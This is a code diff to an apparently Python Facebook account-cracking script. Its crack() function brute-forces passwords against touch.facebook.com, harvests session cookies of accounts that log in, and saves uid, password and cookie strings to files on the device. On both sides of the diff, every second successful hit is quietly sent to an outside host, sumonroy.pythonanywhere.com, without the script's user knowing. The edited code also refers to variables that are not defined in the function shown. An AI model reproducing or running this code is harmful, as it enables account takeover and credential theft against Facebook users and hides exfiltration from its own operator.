@@ -125,7 +125,7 @@ def crack(uid, pww, total_idz):
     try:
         for pw in pww:
             session = requests.Session()
-            requu1 = session.get('https://free.facebook.com')
+            requu1 = session.get('https://touch.facebook.com/')
             data = {
             'm_ts': re.search('name="m_ts" value="(.*?)"', str(requu1.text)).group(1),
             'li': re.search('name="li" value="(.*?)"', str(requu1.text)).group(1),
@@ -175,45 +175,53 @@ def crack(uid, pww, total_idz):
             "sec-ch-prefers-color-scheme":"dark",
             "Accept-Encoding":"gzip, deflate, br, zstd",
             "Accept-Language":"en-GB,en-US;q=0.9,en;q=0.8"}
-            url = 'https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8'
-            po = Session.post(url, data=data, headers=headers, allow_redirects=False).text
-            response = Session.cookies.get_dict().keys()
-            if "c_user" in response:
-                cok = Session.cookies.get_dict()
-                cid = cok["c_user"]
-                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
-                check = check_lock(cid)
-                if "live" in check:
-                    if '%3A-1%3A-1' in coki:
-                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
-                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+            response = session.post('https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',headers=headers,data=data,allow_redirects=False) #proxies=proxs)
+            #print(headers)
+            log_cookies = session.cookies.get_dict().keys()
+            if "c_user" in log_cookies:
+                #kuki = convert(session.cookies.get_dict())
+                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
+                user = re.findall('c_user=(.*);xs', kuki)[0]
+                xs_value = None
+                for part in kuki.split(';'):
+                    if part.startswith('xs='):
+                        xs_value = part.split('=', 1)[1]
+                        break
+                ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
+                res = requests.get(ckk).text
+                if 'Photoshop' in res:
+                    if xs_value and xs_value.rstrip(';').endswith('-1'):
+                        print('\033[1;92m [CRACK-OK] '+user+' | '+pas+'')
+                        print("\033[1;92m [\033[1;92mCOKI\033[1;92m] : \033[1;97m"+kuki)
+                        open("/sdcard/CRACK/CRACK-COOKIE-OK.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                        oks.append(ids)
                         break
                     else:
-                        bkas.append(cid)
+                        bkas.append(user)
                         if len(bkas)% 2 == 0:
-                           statusok = (f"{cid}|{pw}|{coki}")
+                           statusok = (f"{user}|{pas}|{kuki}")
                            requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                         else:
-                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
-                           print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                           oks.append(cid)
+                           print('\033[1;92m [CRACK-OK] '+user+' | '+pas+'')
+                           print("\033[1;92m [\033[1;92mCOKI\033[1;92m] : \033[1;97m"+kuki)
+                           open("/sdcard/CRACK/CRACK-COOKIE-OK.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                           oks.append(ids)
                            break
                 else:
                     break
-            elif 'checkpoint' in response:
-                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
-                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
-                cps.append(uid)
+            elif "checkpoint" in log_cookies:
+                coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
+                cid = coki[24:39]
+                #print('\033[1;91m [CRACK-CP] '+ids+' | '+pas+'')
+                open('/sdcard/CRACK/CP.txt', 'a').write( ids+' | '+pas+'\n')
+                cps.append(ids)
                 break
-            else:
-                continue
+            else:continue
         loop+=1
-    except ce:
+    except requests.exceptions.ConnectionError:
         time.sleep(20)
-    except Exception as error:
-        print({error})
+    except Exception as e:
+        print(f"\nError: {e}")
         pass
 menu()
  
